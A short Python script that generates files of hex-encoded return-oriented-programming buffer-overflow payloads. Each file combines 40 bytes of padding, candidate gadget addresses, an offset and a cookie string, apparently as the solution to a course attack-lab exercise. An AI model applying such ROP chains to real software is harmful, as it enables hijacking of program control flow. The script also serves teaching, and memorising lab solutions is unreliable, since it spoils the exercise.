if __name__ == '__main__':
	step_1_list = ['06 1a 40 00 00 00 00 00', 'ad 1a 40 00 00 00 00 00']
	step_2_list = ['a2 19 40 00 00 00 00 00', 'c5 19 40 00 00 00 00 00']
	step_3_list = ['ab 19 40 00 00 00 00 00', 'cc 19 40 00 00 00 00 00']
	step_4_list = ['dd 19 40 00 00 00 00 00', '42 1a 40 00 00 00 00 00']
	step_5_list = ['34 1a 40 00 00 00 00 00', '69 1a 40 00 00 00 00 00']
	step_6_list = ['13 1a 40 00 00 00 00 00', '27 1a 40 00 00 00 00 00']
	step_7_list = ['d6 19 40 00 00 00 00 00']
	step_8_list = step_2_list

	eight_byte_zero_str = '00 00 00 00 00 00 00 00'
	forty_byte_str = '\n'.join([eight_byte_zero_str for i in range(5)]) + '\n'
	solution_no = 1

	for s1 in step_1_list:
		for s2 in step_2_list:
			for s3 in step_3_list:
				for s4 in step_4_list:
					for s5 in step_5_list:
						for s6 in step_6_list:
							for s7 in step_7_list:
								for s8 in step_8_list:
									text = ''
									text += forty_byte_str
									text += '%s\n%s\n%s\n' % (s1, s2, s3)
									text += '48 00 00 00 00 00 00 00\n'
									text += '%s\n%s\n%s\n%s\n%s\n' % (s4, s5, s6, s7, s8)
									text += 'fa 18 40 00 00 00 00 00\n'
									text += '35 39 62 39 39 37 66 61 00\n'

									filename = 'solution%d.txt' % solution_no
									solution_no += 1
									with open(filename, 'w') as file:
										file.write(text);

